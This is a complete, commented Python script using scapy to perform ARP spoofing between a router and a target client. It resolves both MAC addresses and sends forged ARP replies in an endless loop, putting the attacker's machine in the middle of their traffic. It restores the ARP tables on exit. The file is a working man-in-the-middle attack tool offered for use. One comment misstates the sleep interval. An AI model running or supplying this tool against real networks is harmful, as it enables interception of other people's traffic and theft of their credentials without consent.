import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--routerIP", dest="router", help="Router IP")
    parser.add_argument("-c", "--clientIP", dest="client", help="Target client's IP")
    # Arguments in the form of -t "IP"  or --targetIP "IP". Use --help for help.
    arguments = parser.parse_args()
    if not arguments.router:
        parser.error("[-] Please provide the router IP")
    elif not arguments.client:
        parser.error("[-] Please provide the clinet IP")
    return arguments # Contains the router and target IP

def get_mac(ip):
    try:
        arp_request=scapy.ARP(pdst=ip) # ARP request packet (Who has "ip"?)
        #arp_request.pdst=ip #Alternatively for above field
        broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Ethernet packet for broadcast
        arp_request_broadcast = broadcast/arp_request # packet containing arp in an ethernet broadcase frame

        (answered_list,unanswered_list) = scapy.srp(arp_request_broadcast,timeout=4, retry=3,verbose=False) # Returns 2 lists: One for answered packet, one for unanswered packet
        # send packet and receive response. timeout specifies how long to wait for unanswered packets in seconds
        # These lists are of the form (packet sent, packet response)
        # answered_list.summary() # Output: Request ==> Response
        #unanswered_list.summary() # Output: Request

        # Only one element in answered_list as we're gonna pass a single IP, and not a range
        return answered_list[0][1].hwsrc # Return the MAC address
    except IndexError:
        print("[-] Target not responding, possibly out of range.")


def spoof(target_ip, spoof_ip, target_mac):
    #scapy.ls(scapy.ARP) # To see all the fields we can set for scapy.ARP class
    # op=1 for request(default), op=2 for response. pdst = IP of the target computer, hwdst = MAC of the target computer
    #psrc, hwsrc : Fake info for the source
    #target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # Our MAC address will be used as the source MAC (hwsrc)
    #print(packet.show()) # Show detailed contents of the packet
    #print(packet.summary()) # Show just the packet summary
    scapy.send(packet, verbose=False)
    # verbose tells it not to print anything

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip) # This will be the correct MAC (not ours)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

sent_packets_count =0
arguments = get_arguments()
routerIP = arguments.router
clientIP = arguments.client
routerMAC = get_mac(routerIP)
clientMAC = get_mac(clientIP)
try:
    while(True):
        spoof(routerIP,clientIP, routerMAC) # Fooling the router
        spoof(clientIP,routerIP, clientMAC) # Fooling the client
        sent_packets_count=sent_packets_count+2
        print("\r[+] Sent packets: "+str(sent_packets_count), end="")
        # end="" allows printing on the same line (python 3)
        # The \r allows to overwrite on the current line instead of appending on the current line
        # Overall this will be used to achieve this thing where the output is updated in the same line
        time.sleep(1) # Sleep for 2 seconds and send packets again

except KeyboardInterrupt: # On a KeyBoardInterrupt
    print("\n[-] Ctrl+C detected. Restoring ARP tables. Bye bye.")
    restore(routerIP,clientIP)
    restore(clientIP,routerIP)
    # Restore ARP tables. Though they will automatically reset after a few seconds



